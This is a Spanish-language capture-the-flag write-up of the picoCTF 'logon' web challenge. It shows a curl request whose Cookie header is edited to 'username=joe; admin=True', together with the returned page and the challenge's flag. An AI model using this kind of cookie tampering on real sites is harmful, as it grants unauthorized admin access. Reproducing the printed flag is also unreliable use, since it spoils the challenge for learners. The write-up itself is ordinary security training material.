#  logon
# Objetivos
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/44573/` ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573

# Solucion
```bash

C:\Users\Admin>curl "https://jupiter.challenges.picoctf.org/problem/44573/flag" ^
¿Más?   -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ^
¿Más?   -H "Accept-Language: es-419,es;q=0.5" ^
¿Más?   -H "Cache-Control: max-age=0" ^
¿Más?   -H "Connection: keep-alive" ^
¿Más?   -H "Cookie: cf_clearance=A7lfhgVJXybCKC3HlWEyKU__j6nSr8aSTg6LQhc7Zq0-1696261722-0-1-9c6cc32d.6d835aea.cb6d9ccd-0.2.1696261722; __cf_bm=PolsNdTY5qS_4_GEmzOY9kG.FgsZteoZ431LR3AmRsQ-1696262621-0-AY3/hnhnIU6smPzHF6yC3AwMdNwEFCiVdcSJmYmPFxpnDGxc3XOLq4rGeGx6GSW8Xb8m+9w7vbhLdnKc1M6EhZk=; password=; username=joe; admin=True" ^
¿Más?   -H "Referer: https://jupiter.challenges.picoctf.org/problem/44573/" ^
¿Más?   -H "Sec-Fetch-Dest: document" ^
¿Más?   -H "Sec-Fetch-Mode: navigate" ^
¿Más?   -H "Sec-Fetch-Site: same-origin" ^
¿Más?   -H "Sec-Fetch-User: ?1" ^
¿Más?   -H "Sec-GPC: 1" ^
¿Más?   -H "Upgrade-Insecure-Requests: 1" ^
¿Más?   -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" ^
¿Más?   -H "sec-ch-ua: ^\^"Brave^\^";v=^\^"117^\^", ^\^"Not;A=Brand^\^";v=^\^"8^\^", ^\^"Chromium^\^";v=^\^"117^\^"" ^
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Factory Login</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/logout" class="btn btn-link pull-right">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Factory Login</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF 2019</p>
        </footer>

    </div>
</body>

</html>curl: (3) URL using bad/illegal format or missing URL
curl: (3) URL using bad/illegal format or missing URL

C:\Users\Admin>  -H "sec-ch-ua-mobile: ?0" ^
¿Más?   -H "sec-ch-ua-platform: ^\^"Windows^\^"" ^
"-H" no se reconoce como un comando interno o externo,
programa o archivo por lotes ejecutable.

C:\Users\Admin>  --compressed
"--compressed" no se reconoce como un comando interno o externo,
programa o archivo por lotes ejecutable.


```

# Notas adicionales
Solo se requirió copiar el curl de la pagina y editar el acceso habilitando la opcion de admin a true
# Referencias
